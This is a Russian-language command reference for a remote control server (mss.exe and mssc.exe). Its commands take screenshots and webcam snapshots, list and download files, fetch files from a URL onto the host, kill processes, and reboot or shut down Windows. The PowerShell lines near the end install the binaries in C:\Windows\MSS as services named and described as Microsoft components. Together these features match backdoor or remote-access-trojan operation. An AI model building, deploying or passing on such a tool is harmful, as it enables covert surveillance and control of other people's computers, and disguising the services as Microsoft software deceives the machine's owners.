# Server

mssc.exe:

c - Получить статус сервера
l - Получить лог
e - Очистить лог
s - Запустить сервис (имя)
d - Остановить сервис (имя)
r - Перезапустить сервис (имя)
p - Запустить процесс(имя или путь)
m - Переместить файл (путь?путь) // %FMC:\Folder\file.img?C:\NewFolder\file.img
x - Убить процесс сервера

mss.exe:

Спецсимволы:
? - Разделитель путей

Нулевой уровень:
con - Получить статус сервера
l - Получить лог
cl - Очистить лог
tmp - Получить имя текущей временной папки пользователя ОС
sr - Перезагрузить ОС
sfr - Принудительно перезагрузить ОС
se - Выключить ОС
sfe - Принудительно выключить ОС
x - Убить процесс сервера

[$] Первый уровень:
C - Получить список каталогов (путь(чтобы получить список локальных дисков путь не указываем)) // $C или $CC:\Windows
F - Получить список файлов // $FC:\Windows
P - Получить список запущеных процессов // $P
K - Убить процесс (путь) // $Kexplorer
S - Получить скриншот экрана // $S
W - Получить снимок веб камеры // $W


[%] Второй уровень:
D - Управление директориями
	C - Создать (путь) // %DCC:\Folder
	D - Удалить (путь) // %DDC:\Folder
	M - Переместить (путь?путь) // %DMC:\Folder?C:\Users\Folder или %DMC:\Folder?C:\NewFolder
F - Управление файлами
	C - Создать (путь) // %FCC:\Folder\file.img
	D - Удалить (путь) // %FDC:\Folder\file.img
	M - Переместить (путь?путь) // %FMC:\Folder\file.img?C:\NewFolder\file.img
	L - Скачать файл (путь) // %FLC:\Folder\file.img
	U - Загрузить файл (ссылка?имя) // %FUmysite.ru/download/file.img?file.img
U - Универсальные команды
	Z - Архивация файлов (путь к папке с файлами) // %UZC:\Folder\zipfolder
	U - Разархивация файлов (файл?путь) // %UГC:\Folder\Arhive.zip?C:\NewFolder
	P - Смена порта (Необходима перезагрузка сервера) // %UP8009

Power Shell:

Создать:
New-Service -Name MSS -BinaryPathName C:\Windows\MSS\mss.exe -DisplayName "Microsoft Server" -Description "Microsoft Server Service"
New-Service -Name MSSC -BinaryPathName C:\Windows\MSS\mssc.exe -DisplayName "Microsoft Server Control" -Description "Microsoft Server Controls Service"

Изменить:
Set-Service -Name MSS -Description "Microsoft Server Service" -StartupType Manual
Set-Service -Name MSSC -Description "Microsoft Server Service Control" -StartupType Manual

Удалить:
(Get-WmiObject win32_service -Filter "name='MSS'").delete()
(Get-WmiObject win32_service -Filter "name='MSSC'").delete()
